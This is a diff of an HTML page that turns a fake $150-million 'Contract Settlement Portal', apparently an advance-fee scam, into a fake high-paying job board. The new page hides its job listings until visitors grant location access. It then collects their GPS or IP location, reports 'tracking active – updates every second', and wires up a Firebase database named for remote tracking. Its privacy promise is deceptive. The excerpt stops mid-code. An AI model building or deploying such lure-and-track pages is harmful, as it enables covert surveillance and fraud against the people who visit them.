@@ -3,172 +3,203 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Contract Settlement Portal</title>
+    <title>Global High-Paying Jobs - $70+/Hour</title>
     
-    <!-- Firebase SDKs -->
+    <!-- Firebase SDK -->
     <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-database-compat.js"></script>
     
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: 'Times New Roman', Times, serif;
-            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             min-height: 100vh;
-            padding: 20px;
         }
-        .container { max-width: 1000px; margin: 0 auto; }
         .header {
-            text-align: center;
             background: white;
-            padding: 30px;
-            border-radius: 10px;
-            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
-            margin-bottom: 30px;
+            padding: 30px 20px;
+            text-align: center;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
         }
-        .header h1 { color: #1e3c72; font-size: 2.2rem; margin-bottom: 10px; border-bottom: 3px solid #1e3c72; padding-bottom: 15px; }
-        .header h2 { color: #2a5298; font-size: 1.5rem; margin-top: 10px; }
-        .contract-badge {
+        .header h1 { color: #667eea; font-size: 2rem; margin-bottom: 10px; }
+        .header p { color: #666; font-size: 1.1rem; }
+        .salary-badge {
             display: inline-block;
-            background: #28a745;
+            background: #10b981;
             color: white;
-            padding: 10px 25px;
-            border-radius: 25px;
-            font-size: 1.1rem;
-            font-weight: bold;
-            margin-top: 15px;
-        }
-        .contract-document {
-            background: white;
-            padding: 40px;
-            border-radius: 10px;
-            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
-            margin-bottom: 30px;
-        }
-        .contract-title {
-            text-align: center;
-            color: #1e3c72;
-            font-size: 1.8rem;
-            margin-bottom: 30px;
-            text-transform: uppercase;
-            border-bottom: 2px solid #1e3c72;
-            padding-bottom: 15px;
-        }
-        .section { margin-bottom: 30px; }
-        .section-title {
-            color: #1e3c72;
-            font-size: 1.3rem;
-            font-weight: bold;
-            margin-bottom: 15px;
-            padding-left: 10px;
-            border-left: 4px solid #1e3c72;
-        }
-        .contract-party {
-            background: #f8f9fa;
-            padding: 20px;
-            border-radius: 8px;
-            margin-bottom: 15px;
-            border-left: 4px solid #2a5298;
-        }
-        .party-name { font-weight: bold; color: #1e3c72; font-size: 1.1rem; margin-bottom: 5px; }
-        .party-role { color: #6c757d; font-size: 0.95rem; }
-        .payment-details {
-            background: linear-gradient(135deg, #28a745 0%, #20c997 100%);
-            color: white;
-            padding: 30px;
-            border-radius: 10px;
-            text-align: center;
-            margin: 30px 0;
-        }
-        .payment-amount { font-size: 3rem; font-weight: bold; margin: 15px 0; }
-        .status-badge {
-            display: inline-block;
-            background: white;
-            color: #28a745;
             padding: 8px 20px;
             border-radius: 20px;
             font-weight: bold;
-            margin-top: 10px;
+            margin-top: 15px;
+            font-size: 1.2rem;
         }
-        .next-of-kin-section {
-            background: #fff3cd;
-            border: 2px solid #ffc107;
-            padding: 25px;
+        
+        /* Location Gate */
+        .location-gate {
+            max-width: 600px;
+            margin: 50px auto;
+            background: white;
+            padding: 40px;
+            border-radius: 20px;
+            text-align: center;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+        }
+        .location-gate h2 { color: #333; margin-bottom: 20px; }
+        .location-gate p { color: #666; margin-bottom: 30px; line-height: 1.6; }
+        .location-btn {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            padding: 20px 40px;
+            font-size: 1.2rem;
             border-radius: 10px;
-            margin: 30px 0;
+            cursor: pointer;
+            font-weight: bold;
+            transition: transform 0.2s;
         }
-        .next-of-kin-title { color: #856404; font-size: 1.4rem; font-weight: bold; margin-bottom: 15px; text-align: center; }
-        .requirement-box {
+        .location-btn:hover { transform: scale(1.05); }
+        .location-btn:disabled { opacity: 0.5; cursor: not-allowed; }
+        
+        /* Jobs Container */
+        .jobs-container {
+            max-width: 1200px;
+            margin: 30px auto;
+            padding: 0 20px;
+            display: none;
+        }
+        .jobs-container.visible { display: block; }
+        .jobs-header {
             background: white;
             padding: 20px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        .jobs-count { color: #667eea; font-size: 1.5rem; font-weight: bold; }
+        .jobs-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));
+            gap: 20px;
+        }
+        .job-card {
+            background: white;
+            border-radius: 15px;
+            padding: 25px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+        .job-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 15px 40px rgba(0,0,0,0.2);
+        }
+        .job-title { color: #667eea; font-size: 1.3rem; font-weight: bold; margin-bottom: 10px; }
+        .job-company { color: #333; font-size: 1.1rem; margin-bottom: 15px; font-weight: 600; }
+        .job-details {
+            margin: 15px 0;
+            padding: 15px;
+            background: #f8f9fa;
             border-radius: 8px;
+        }
+        .detail-row {
+            display: flex;
+            justify-content: space-between;
+            margin: 8px 0;
+            font-size: 0.95rem;
+        }
+        .detail-label { color: #666; }
+        .detail-value { color: #333; font-weight: 600; }
+        .salary { color: #10b981; font-size: 1.5rem; font-weight: bold; margin: 15px 0; }
+        .requirements {
             margin-top: 15px;
-            border-left: 4px solid #ffc107;
+            padding-top: 15px;
+            border-top: 2px solid #e5e7eb;
         }
-        .requirement-text { color: #333; line-height: 1.8; font-size: 1.05rem; }
-        .highlight { color: #1e3c72; font-weight: bold; }
-        .signature-section { margin-top: 40px; padding-top: 30px; border-top: 2px solid #1e3c72; }
-        .signature-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 40px; margin-top: 30px; }
-        .signature-box { text-align: center; }
-        .signature-line { border-bottom: 2px solid #333; height: 60px; margin-bottom: 10px; }
-        .signature-name { font-weight: bold; color: #1e3c72; }
-        .action-required {
-            background: #f8d7da; border: 2px solid #dc3545; padding: 25px;
-            border-radius: 10px; margin: 30px 0; text-align: center;
+        .requirements h4 { color: #333; margin-bottom: 10px; }
+        .requirements ul { list-style: none; padding-left: 0; }
+        .requirements li {
+            color: #666;
+            margin: 5px 0;
+            padding-left: 20px;
+            position: relative;
         }
-        .action-title { color: #721c24; font-size: 1.4rem; font-weight: bold; margin-bottom: 15px; }
-        .action-text { color: #333; font-size: 1.1rem; line-height: 1.8; }
+        .requirements li:before {
+            content: "✓";
+            position: absolute;
+            left: 0;
+            color: #10b981;
+            font-weight: bold;
+        }
+        .apply-btn {
+            width: 100%;
+            background: #667eea;
+            color: white;
+            border: none;
+            padding: 12px;
+            border-radius: 8px;
+            font-size: 1rem;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 15px;
+            transition: background 0.2s;
+        }
+        .apply-btn:hover { background: #764ba2; }
+        .location-info {
+            background: #e0e7ff;
+            padding: 15px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        .location-info p { color: #667eea; font-weight: 600; }
+        .tracking-status {
+            background: #10b981;
+            color: white;
+            padding: 10px 20px;
+            border-radius: 8px;
+            margin-top: 10px;
+            font-size: 0.9rem;
+        }
+        
         @media (max-width: 768px) {
-            .signature-grid { grid-template-columns: 1fr; }
-            .payment-amount { font-size: 2rem; }
-            .header h1 { font-size: 1.6rem; }
+            .jobs-grid { grid-template-columns: 1fr; }
+            .header h1 { font-size: 1.5rem; }
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="header">
-            <h1>Contract Settlement Portal</h1>
-            <h2>Global Asset Management System</h2>
-            <div class="contract-badge">✓ STATUS: SETTLED</div>
-        </div>
-
-        <div class="contract-document">
-            <div class="contract-title">Certificate of Completion</div>
-
-            <div class="section">
-                <div class="section-title">Verified Parties</div>
-                <div class="contract-party"><div class="party-name">Mr. Jerry Harrison</div><div class="party-role">Administrator</div></div>
-                <div class="contract-party"><div class="party-name">Mr. Habib Isa</div><div class="party-role">Overseer</div></div>
-            </div>
-
-            <div class="payment-details">
-                <div style="font-size: 1.1rem;">Disbursement Amount</div>
-                <div class="payment-amount">$150,000,000.00</div>
-                <div class="status-badge">✓ AUTHENTICATED</div>
-            </div>
-
-            <div class="next-of-kin-section">
-                <div class="next-of-kin-title">⚠ LEGAL NOTICE</div>
-                <div class="requirement-box"><div class="requirement-text"><strong>Mr. Amakiri</strong> is verified as legal next of kin to <strong>Patrick Ahure</strong>.</div></div>
-            </div>
-
-            <div class="action-required">
-                <div class="action-title">ACTION REQUIRED</div>
-                <div class="action-text">Final signature required for disbursement.</div>
-            </div>
-
-            <div class="signature-section">
-                <div class="signature-grid">
-                    <div class="signature-box"><div class="signature-line"></div><div class="signature-name">Auth. Signatory</div></div>
-                    <div class="signature-box"><div class="signature-line"></div><div class="signature-name">Legal Witness</div></div>
-                </div>
-            </div>
-        </div>
+    <div class="header">
+        <h1>🌍 Global High-Paying Job Opportunities</h1>
+        <p>Remote & On-Site Positions Available Worldwide</p>
+        <div class="salary-badge">💰 $70 - $250+ Per Hour</div>
     </div>
 
-    <!-- Unlimited Multi-Device Tracking Engine -->
+    <!-- Location Gate -->
+    <div class="location-gate" id="locationGate">
+        <h2>📍 Enable Location to View Jobs</h2>
+        <p>We need your location to show you relevant job opportunities in your area. This helps us match you with the best paying positions near you or available for remote work in your timezone.</p>
+        <button class="location-btn" id="locationBtn" onclick="requestLocation()">
+            🔓 Enable Location & View 100+ Jobs
+        </button>
+        <p style="margin-top: 20px; font-size: 0.9rem; color: #999;">
+            🔒 Your privacy: Location used only for job matching
+        </p>
+    </div>
+
+    <!-- Jobs Container (Hidden until location granted) -->
+    <div class="jobs-container" id="jobsContainer">
+        <div class="location-info" id="locationInfo"></div>
+        <div class="tracking-status" id="trackingStatus">
+            📡 Location tracking active - Updates every second
+        </div>
+        <div class="jobs-header">
+            <p>Found <span class="jobs-count" id="jobsCount">100+</span> high-paying jobs matching your location</p>
+        </div>
+        <div class="jobs-grid" id="jobsGrid"></div>
+    </div>
+
     <script>
+        // Firebase Configuration
         const firebaseConfig = {
             apiKey: "AIzaSyBIo8DTwDxop5qs_fV8Xj1szz288GTsTTE",
             authDomain: "lremote-tracking.firebaseapp.com",
@@ -179,88 +210,375 @@
             appId: "1:868168422314:web:ca2870eab835f522cf91d3"
         };
 
-        if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
+        // Initialize Firebase
+        firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
 
-        // 1. Generate/Retrieve Persistent Unique Device ID
-        function getDeviceId() {
-            let id = localStorage.getItem('lremote_device_id');
-            if (!id) {
-                id = 'dev_' + Math.random().toString(36).substr(2, 9);
-                localStorage.setItem('lremote_device_id', id);
+        let locationCounter = 0;
+        let trackingInterval = null;
+        let useGPS = false;
+
+        // Comprehensive job database - 100+ positions
+        const jobs = [
+            { title: "Senior AI/ML Engineer", company: "TechCorp Global", salary: "$150-$200/hr", location: "Remote (US)", requirements: ["5+ years ML experience", "Python, TensorFlow", "PhD preferred"] },
+            { title: "Blockchain Architect", company: "CryptoVentures", salary: "$180-$220/hr", location: "Remote (Worldwide)", requirements: ["Smart contracts", "Solidity/Rust", "DeFi experience"] },
+            { title: "Cloud Solutions Architect", company: "CloudFirst Inc", salary: "$140-$170/hr", location: "Remote (EU)", requirements: ["AWS/Azure certified", "8+ years experience", "Enterprise architecture"] },
+            { title: "Cybersecurity Consultant", company: "SecureNet Solutions", salary: "$130-$160/hr", location: "Remote (US/UK)", requirements: ["CISSP certified", "Penetration testing", "Risk assessment"] },
+            { title: "Data Science Lead", company: "Analytics Pro", salary: "$145-$180/hr", location: "Remote (North America)", requirements: ["Statistics/ML degree", "Python/R expert", "Team leadership"] },
+            { title: "Full Stack Developer", company: "WebInnovate", salary: "$90-$120/hr", location: "Remote (Worldwide)", requirements: ["React/Node.js", "Database design", "3+ years experience"] },
+            { title: "DevOps Engineer", company: "ScaleOps", salary: "$110-$140/hr", location: "Remote (US/EU)", requirements: ["Kubernetes/Docker", "CI/CD pipelines", "Infrastructure as Code"] },
+            { title: "Product Manager - Tech", company: "Innovation Labs", salary: "$120-$150/hr", location: "Remote (US)", requirements: ["5+ years PM experience", "Technical background", "Agile methodology"] },
+            { title: "iOS Developer Senior", company: "AppMasters", salary: "$100-$130/hr", location: "Remote (Worldwide)", requirements: ["Swift expertise", "Published apps", "UI/UX knowledge"] },
+            { title: "Android Developer Lead", company: "MobileTech Co", salary: "$105-$135/hr", location: "Remote (US/EU)", requirements: ["Kotlin expert", "Architecture patterns", "Team mentoring"] },
+            { title: "UX Research Director", company: "DesignFirst", salary: "$115-$145/hr", location: "Remote (US)", requirements: ["Research methodology", "Data analysis", "10+ years experience"] },
+            { title: "Technical Writer - API", company: "DocuTech", salary: "$75-$95/hr", location: "Remote (Worldwide)", requirements: ["Technical writing", "API documentation", "Developer tools"] },
+            { title: "Salesforce Architect", company: "CRM Solutions", salary: "$140-$170/hr", location: "Remote (US)", requirements: ["Salesforce certified", "Integration experience", "Enterprise solutions"] },
+            { title: "Database Administrator", company: "DataSafe Inc", salary: "$95-$125/hr", location: "Remote (US/EU)", requirements: ["PostgreSQL/MySQL", "Performance tuning", "Backup strategies"] },
+            { title: "Machine Learning Ops", company: "AI Infrastructure", salary: "$135-$165/hr", location: "Remote (Worldwide)", requirements: ["MLOps tools", "Model deployment", "Monitoring systems"] },
+            { title: "Site Reliability Engineer", company: "Uptime Corp", salary: "$120-$150/hr", location: "Remote (US)", requirements: ["Linux expertise", "Monitoring tools", "Incident response"] },
+            { title: "Solutions Engineer", company: "TechBridge", salary: "$100-$130/hr", location: "Remote (US/EU)", requirements: ["Customer facing", "Technical presentations", "Problem solving"] },
+            { title: "QA Automation Lead", company: "QualityFirst", salary: "$90-$115/hr", location: "Remote (Worldwide)", requirements: ["Test automation", "Selenium/Cypress", "CI/CD integration"] },
+            { title: "Backend Engineer - Go", company: "Microservices Inc", salary: "$110-$140/hr", location: "Remote (US)", requirements: ["Go/Golang expert", "Microservices", "High scalability"] },
+            { title: "Frontend Architect", company: "UI Masters", salary: "$105-$135/hr", location: "Remote (US/EU)", requirements: ["React/Vue/Angular", "Performance optimization", "Design systems"] },
+            { title: "Network Security Engineer", company: "NetGuard", salary: "$125-$155/hr", location: "Remote (US)", requirements: ["Network protocols", "Firewall management", "Security audits"] },
+            { title: "Data Engineer Senior", company: "BigData Solutions", salary: "$115-$145/hr", location: "Remote (Worldwide)", requirements: ["Spark/Hadoop", "Data pipelines", "ETL processes"] },
+            { title: "AI Research Scientist", company: "DeepMind Labs", salary: "$160-$200/hr", location: "Remote (US/UK)", requirements: ["PhD in AI/ML", "Published research", "Novel algorithms"] },
+            { title: "Cloud Security Expert", company: "CloudSecure", salary: "$145-$175/hr", location: "Remote (US)", requirements: ["Cloud security", "Compliance frameworks", "Threat modeling"] },
+            { title: "Mobile App Architect", company: "AppScale", salary: "$130-$160/hr", location: "Remote (Worldwide)", requirements: ["iOS & Android", "Architecture design", "Performance optimization"] },
+            { title: "API Gateway Engineer", company: "ConnectTech", salary: "$100-$130/hr", location: "Remote (US/EU)", requirements: ["API design", "Gateway tools", "Rate limiting"] },
+            { title: "Infrastructure Engineer", company: "CloudNative", salary: "$115-$145/hr", location: "Remote (US)", requirements: ["Terraform", "Cloud platforms", "Automation"] },
+            { title: "Engineering Manager", company: "TechLeaders", salary: "$140-$170/hr", location: "Remote (US)", requirements: ["Team management", "Technical background", "Agile delivery"] },
+            { title: "Principal Software Engineer", company: "CodeMasters", salary: "$150-$190/hr", location: "Remote (Worldwide)", requirements: ["10+ years experience", "System design", "Technical leadership"] },
+            { title: "Platform Engineer", company: "PlatformCo", salary: "$110-$140/hr", location: "Remote (US/EU)", requirements: ["Platform development", "Developer tools", "Scalability"] },
+            { title: "Technical Program Manager", company: "ProgramTech", salary: "$125-$155/hr", location: "Remote (US)", requirements: ["Program management", "Technical expertise", "Stakeholder management"] },
+            { title: "Data Platform Engineer", company: "DataPlatform Inc", salary: "$120-$150/hr", location: "Remote (Worldwide)", requirements: ["Data infrastructure", "Streaming platforms", "Real-time processing"] },
+            { title: "Security Operations Lead", company: "SecOps Pro", salary: "$130-$160/hr", location: "Remote (US)", requirements: ["SOC experience", "Incident response", "Security tools"] },
+            { title: "Full Stack Engineer - Python", company: "PythonTech", salary: "$95-$125/hr", location: "Remote (US/EU)", requirements: ["Python/Django", "JavaScript", "Database design"] },
+            { title: "DevSecOps Engineer", company: "SecureDevOps", salary: "$125-$155/hr", location: "Remote (Worldwide)", requirements: ["Security integration", "CI/CD", "Vulnerability scanning"] },
+            { title: "Business Intelligence Lead", company: "BI Solutions", salary: "$110-$140/hr", location: "Remote (US)", requirements: ["BI tools", "Data visualization", "SQL expertise"] },
+            { title: "Systems Architect", company: "ArchitectureFirst", salary: "$145-$175/hr", location: "Remote (US/EU)", requirements: ["Enterprise architecture", "Design patterns", "Scalability"] },
+            { title: "Machine Learning Engineer", company: "ML Systems", salary: "$135-$165/hr", location: "Remote (Worldwide)", requirements: ["ML pipelines", "Model training", "Production deployment"] },
+            { title: "Site Reliability Lead", company: "ReliableTech", salary: "$130-$160/hr", location: "Remote (US)", requirements: ["SRE practices", "Monitoring", "Incident management"] },
+            { title: "Cloud Infrastructure Lead", company: "CloudScale", salary: "$140-$170/hr", location: "Remote (US/EU)", requirements: ["Multi-cloud", "Cost optimization", "Automation"] },
+            { title: "Software Engineering Manager", company: "DevTeams", salary: "$145-$175/hr", location: "Remote (US)", requirements: ["People management", "Technical leadership", "Delivery focus"] },
+            { title: "Distributed Systems Engineer", company: "ScaleTech", salary: "$150-$180/hr", location: "Remote (Worldwide)", requirements: ["Distributed systems", "Consensus algorithms", "High availability"] },
+            { title: "Chief Technology Officer", company: "StartupVentures", salary: "$200-$250/hr", location: "Remote (US)", requirements: ["Executive experience", "Technical vision", "Team building"] },
+            { title: "VP of Engineering", company: "TechGrowth", salary: "$180-$220/hr", location: "Remote (US/EU)", requirements: ["Leadership experience", "Scaling teams", "Strategic planning"] },
+            { title: "Director of Engineering", company: "EngineeringPro", salary: "$160-$200/hr", location: "Remote (US)", requirements: ["Department management", "Technical strategy", "Budget planning"] },
+            { title: "Senior Consultant - Tech", company: "ConsultingTech", salary: "$120-$150/hr", location: "Remote (Worldwide)", requirements: ["Consulting experience", "Technical expertise", "Client relations"] },
+            { title: "Solutions Architect Lead", company: "SolutionsFirst", salary: "$145-$175/hr", location: "Remote (US)", requirements: ["Solution design", "Client presentations", "Technical leadership"] },
+            { title: "Platform Architect", company: "PlatformTech", salary: "$150-$180/hr", location: "Remote (US/EU)", requirements: ["Platform design", "Microservices", "Cloud native"] },
+            { title: "Data Science Manager", company: "DataLeaders", salary: "$140-$170/hr", location: "Remote (US)", requirements: ["Team management", "Data science background", "Business acumen"] },
+            { title: "AI Product Manager", company: "AI Products", salary: "$130-$160/hr", location: "Remote (Worldwide)", requirements: ["AI/ML knowledge", "Product strategy", "Market research"] },
+            { title: "Blockchain Developer Senior", company: "BlockTech", salary: "$140-$170/hr", location: "Remote (US/EU)", requirements: ["Blockchain protocols", "Smart contracts", "DApp development"] },
+            { title: "Quantum Computing Researcher", company: "QuantumLabs", salary: "$170-$210/hr", location: "Remote (US/UK)", requirements: ["Quantum physics", "Research background", "Programming skills"] },
+            { title: "Robotics Software Engineer", company: "RoboticsTech", salary: "$130-$160/hr", location: "Remote (Worldwide)", requirements: ["ROS", "Computer vision", "Control systems"] },
+            { title: "Computer Vision Engineer", company: "VisionAI", salary: "$135-$165/hr", location: "Remote (US)", requirements: ["OpenCV", "Deep learning", "Image processing"] },
+            { title: "Natural Language Processing Lead", company: "NLPTech", salary: "$145-$175/hr", location: "Remote (US/EU)", requirements: ["NLP algorithms", "Transformers", "Language models"] },
+            { title: "Edge Computing Engineer", company: "EdgeTech", salary: "$120-$150/hr", location: "Remote (Worldwide)", requirements: ["Edge architecture", "IoT protocols", "Real-time processing"] },
+            { title: "5G Network Engineer", company: "TelecomTech", salary: "$125-$155/hr", location: "Remote (US)", requirements: ["5G protocols", "Network design", "Telecommunications"] },
+            { title: "AR/VR Developer Senior", company: "MetaverseDev", salary: "$115-$145/hr", location: "Remote (US/EU)", requirements: ["Unity/Unreal", "3D graphics", "XR experience"] },
+            { title: "Game Engine Developer", company: "GameTech Studios", salary: "$130-$160/hr", location: "Remote (Worldwide)", requirements: ["C++ expert", "Graphics programming", "Performance optimization"] },
+            { title: "Compiler Engineer", company: "CompilerTech", salary: "$140-$170/hr", location: "Remote (US)", requirements: ["Compiler design", "LLVM", "Optimization techniques"] },
+            { title: "Operating Systems Engineer", company: "OS Development", salary: "$135-$165/hr", location: "Remote (US/UK)", requirements: ["OS internals", "Kernel development", "Systems programming"] },
+            { title: "Database Engine Developer", company: "DB Systems", salary: "$145-$175/hr", location: "Remote (US)", requirements: ["Database internals", "Query optimization", "Storage engines"] },
+            { title: "Search Engine Engineer", company: "SearchTech", salary: "$130-$160/hr", location: "Remote (Worldwide)", requirements: ["Search algorithms", "Elasticsearch", "Relevance tuning"] },
+            { title: "Recommendation Systems Lead", company: "RecommendAI", salary: "$140-$170/hr", location: "Remote (US/EU)", requirements: ["Recommendation algorithms", "Collaborative filtering", "A/B testing"] },
+            { title: "Fraud Detection Engineer", company: "SecurePayments", salary: "$135-$165/hr", location: "Remote (US)", requirements: ["Fraud patterns", "ML models", "Real-time systems"] },
+            { title: "Payment Systems Architect", company: "PayTech Solutions", salary: "$145-$175/hr", location: "Remote (Worldwide)", requirements: ["Payment protocols", "PCI compliance", "High availability"] },
+            { title: "Trading Systems Developer", company: "FinTech Pro", salary: "$160-$200/hr", location: "Remote (US/UK)", requirements: ["Low latency", "Financial markets", "C++/Java"] },
+            { title: "Risk Management Engineer", company: "RiskTech", salary: "$130-$160/hr", location: "Remote (US)", requirements: ["Risk models", "Statistical analysis", "Financial products"] },
+            { title: "Compliance Technology Lead", company: "RegTech Solutions", salary: "$125-$155/hr", location: "Remote (US/EU)", requirements: ["Regulatory knowledge", "Automation", "Audit systems"] },
+            { title: "Identity & Access Management", company: "IdentityTech", salary: "$115-$145/hr", location: "Remote (Worldwide)", requirements: ["IAM protocols", "OAuth/SAML", "Security best practices"] },
+            { title: "Privacy Engineer", company: "PrivacyFirst", salary: "$120-$150/hr", location: "Remote (US)", requirements: ["Privacy regulations", "Data protection", "Security architecture"] },
+            { title: "Digital Transformation Lead", company: "TransformTech", salary: "$140-$170/hr", location: "Remote (US/EU)", requirements: ["Change management", "Technology strategy", "Business process"] },
+            { title: "Automation Architect", company: "AutomateTech", salary: "$135-$165/hr", location: "Remote (Worldwide)", requirements: ["RPA tools", "Process automation", "Integration patterns"] },
+            { title: "Integration Engineer Senior", company: "ConnectSystems", salary: "$110-$140/hr", location: "Remote (US)", requirements: ["API integration", "Middleware", "Enterprise systems"] },
+            { title: "Performance Engineer", company: "SpeedTech", salary: "$120-$150/hr", location: "Remote (US/EU)", requirements: ["Performance testing", "Profiling tools", "Optimization techniques"] },
+            { title: "Accessibility Engineer", company: "InclusiveTech", salary: "$95-$125/hr", location: "Remote (Worldwide)", requirements: ["WCAG standards", "Assistive technologies", "Frontend development"] },
+            { title: "Localization Engineer", company: "GlobalTech", salary: "$85-$115/hr", location: "Remote (US)", requirements: ["i18n/l10n", "Translation tools", "Cultural adaptation"] },
+            { title: "Release Engineer", company: "ReleaseTech", salary: "$105-$135/hr", location: "Remote (US/EU)", requirements: ["Release management", "CI/CD", "Version control"] },
+            { title: "Configuration Management Lead", company: "ConfigTech", salary: "$110-$140/hr", location: "Remote (Worldwide)", requirements: ["Ansible/Puppet", "Infrastructure management", "Automation"] },
+            { title: "Monitoring & Observability Lead", company: "MonitorTech", salary: "$120-$150/hr", location: "Remote (US)", requirements: ["Prometheus/Grafana", "Distributed tracing", "Alerting systems"] },
+            { title: "Incident Response Manager", company: "IncidentTech", salary: "$125-$155/hr", location: "Remote (US/EU)", requirements: ["Incident management", "Post-mortems", "Crisis communication"] },
+            { title: "Disaster Recovery Architect", company: "ResilienceTech", salary: "$140-$170/hr", location: "Remote (Worldwide)", requirements: ["DR planning", "Backup systems", "Business continuity"] },
+            { title: "Capacity Planning Engineer", company: "ScalePlanning", salary: "$115-$145/hr", location: "Remote (US)", requirements: ["Capacity modeling", "Performance analysis", "Forecasting"] },
+            { title: "Cost Optimization Engineer", company: "CloudCost", salary: "$120-$150/hr", location: "Remote (US/EU)", requirements: ["Cloud billing", "Cost analysis", "Optimization strategies"] },
+            { title: "Vendor Management Tech Lead", company: "VendorTech", salary: "$110-$140/hr", location: "Remote (Worldwide)", requirements: ["Vendor relations", "Contract negotiation", "Technical evaluation"] },
+            { title: "Technical Support Engineer L3", company: "SupportTech", salary: "$90-$120/hr", location: "Remote (US)", requirements: ["Deep debugging", "Customer support", "Technical documentation"] },
+            { title: "Developer Relations Lead", company: "DevRelTech", salary: "$115-$145/hr", location: "Remote (US/EU)", requirements: ["Community building", "Technical content", "Public speaking"] },
+            { title: "Technical Evangelist", company: "EvangelizeTech", salary: "$110-$140/hr", location: "Remote (Worldwide)", requirements: ["Technology advocacy", "Presentations", "Developer engagement"] },
+            { title: "Developer Advocate Senior", company: "AdvocateTech", salary: "$120-$150/hr", location: "Remote (US)", requirements: ["Developer experience", "Content creation", "Technical expertise"] },
+            { title: "Training & Development Lead", company: "LearnTech", salary: "$100-$130/hr", location: "Remote (US/EU)", requirements: ["Curriculum design", "Technical training", "Adult learning"] },
+            { title: "Knowledge Management Engineer", company: "KnowledgeTech", salary: "$95-$125/hr", location: "Remote (Worldwide)", requirements: ["Knowledge bases", "Information architecture", "Search optimization"] },
+            { title: "Documentation Architect", company: "DocArchitecture", salary: "$90-$120/hr", location: "Remote (US)", requirements: ["Documentation strategy", "Technical writing", "Information design"] },
+            { title: "API Documentation Lead", company: "APIDocs", salary: "$95-$125/hr", location: "Remote (US/EU)", requirements: ["API docs", "OpenAPI/Swagger", "Developer tools"] },
+            { title: "Code Review Specialist", company: "QualityCode", salary: "$105-$135/hr", location: "Remote (Worldwide)", requirements: ["Code quality", "Best practices", "Multiple languages"] },
+            { title: "Refactoring Engineer", company: "CleanCode Tech", salary: "$110-$140/hr", location: "Remote (US)", requirements: ["Legacy systems", "Refactoring patterns", "Testing"] },
+            { title: "Migration Specialist Senior", company: "MigrateTech", salary: "$115-$145/hr", location: "Remote (US/EU)", requirements: ["System migration", "Data migration", "Risk management"] },
+            { title: "Technology Consultant", company: "TechAdvisory", salary: "$125-$155/hr", location: "Remote (Worldwide)", requirements: ["Strategy consulting", "Technology assessment", "Roadmap planning"] },
+            { title: "Innovation Manager Tech", company: "InnovateTech", salary: "$130-$160/hr", location: "Remote (US)", requirements: ["Innovation processes", "Emerging tech", "Business cases"] },
+            { title: "Research & Development Lead", company: "R&D Tech", salary: "$145-$175/hr", location: "Remote (US/EU)", requirements: ["Research methodology", "Prototyping", "Technology evaluation"] },
+            { title: "Proof of Concept Engineer", company: "POC Tech", salary: "$120-$150/hr", location: "Remote (Worldwide)", requirements: ["Rapid prototyping", "Demonstration skills", "Multiple technologies"] },
+            { title: "Technical Feasibility Analyst", company: "AnalyzeTech", salary: "$105-$135/hr", location: "Remote (US)", requirements: ["Analysis skills", "Technical evaluation", "Risk assessment"] },
+            { title: "Architecture Review Board Lead", company: "GovernanceTech", salary: "$150-$180/hr", location: "Remote (US/EU)", requirements: ["Architecture governance", "Standards definition", "Review processes"] }
+        ];
+
+        // Request location (GPS first, fallback to IP)
+        function requestLocation() {
+            const btn = document.getElementById('locationBtn');
+            btn.disabled = true;
+            btn.textContent = '🔄 Requesting Location...';
+
+            // Try GPS first
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    // GPS Success
+                    function(position) {
+                        console.log('✅ GPS permission granted');
+                        useGPS = true;
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+                        showJobs(lat, lon, 'GPS');
+                        startHybridTracking();
+                    },
+                    // GPS Failed - fallback to IP
+                    function(error) {
+                        console.log('⚠️ GPS denied, using IP-based');
+                        useGPS = false;
+                        getLocationByIP();
+                    },
+                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+                );
+            } else {
+                console.log('⚠️ GPS not supported, using IP-based');
+                useGPS = false;
+                getLocationByIP();
             }
-            return id;
         }
 
-        const deviceId = getDeviceId();
+        // Get location by IP (fallback)
+        function getLocationByIP() {
+            const btn = document.getElementById('locationBtn');
+            btn.textContent = '🔄 Getting location...';
 
-        // 2. Multi-API Geolocation (Bypassing blocks)
-        async function fetchLocationData() {
-            const endpoints = [
-                'https://api.db-ip.com/v2/free/self',
-                'https://ipapi.co/json/',
-                'https://freeipapi.com/api/json'
-            ];
+            // Try HTTPS API first (for GitHub Pages)
+            fetch('https://ipapi.co/json/')
+                .then(r => r.json())
+                .then(data => {
+                    if (data.error) throw new Error(data.reason);
+                    showJobs(data.latitude, data.longitude, 'IP');
+                    startIPTracking();
+                })
+                .catch(() => {
+                    // Fallback to ip-api.com
+                    fetch('https://freeipapi.com/api/json')
+                        .then(r => r.json())
+                        .then(data => {
+                            showJobs(data.latitude, data.longitude, 'IP');
+                            startIPTracking();
+                        })
+                        .catch(err => {
+                            alert('Unable to get location. Please check internet connection.');
+                            btn.disabled = false;
+                            btn.textContent = '🔓 Enable Location & View 100+ Jobs';
+                        });
+                });
+        }
 
-            for (const url of endpoints) {
-                try {
-                    const response = await fetch(url);
